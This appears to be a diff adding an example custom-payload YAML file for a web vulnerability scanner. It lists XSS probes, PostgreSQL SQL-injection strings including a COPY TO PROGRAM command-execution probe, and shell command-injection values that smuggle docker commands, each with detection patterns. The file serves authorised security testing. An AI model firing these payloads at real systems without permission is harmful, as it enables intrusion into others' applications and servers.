@@ -1,0 +1,45 @@
+# Example Custom Payload File for Vulcn
+# This file demonstrates how to create custom payload sets
+
+version: "1"
+
+payloads:
+  # Custom XSS payloads targeting specific frameworks
+  - name: "xss-react"
+    category: "xss"
+    description: "XSS payloads targeting React applications"
+    payloads:
+      - "javascript:alert(1)"
+      - "data:text/html,<script>alert(1)</script>"
+      - '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
+    detectPatterns:
+      - "alert\\(1\\)"
+      - "onerror\\s*="
+
+  # Custom SQLi payloads for PostgreSQL
+  - name: "sqli-postgres"
+    category: "sqli"
+    description: "PostgreSQL-specific SQL injection payloads"
+    payloads:
+      - "'; SELECT pg_sleep(5)--"
+      - "' UNION SELECT NULL,NULL,current_database()--"
+      - "' AND 1=CAST((SELECT version()) AS int)--"
+      - "'; COPY (SELECT '') TO PROGRAM 'id'--"
+    detectPatterns:
+      - "PostgreSQL"
+      - "pg_.*error"
+      - "syntax error at or near"
+
+  # Custom command injection for specific scenarios
+  - name: "cmd-docker"
+    category: "command-injection"
+    description: "Command injection targeting Docker environments"
+    payloads:
+      - "; docker ps"
+      - "| docker images"
+      - "`docker info`"
+      - "$(docker version)"
+    detectPatterns:
+      - "CONTAINER ID"
+      - "REPOSITORY.*TAG"
+      - "Docker version"
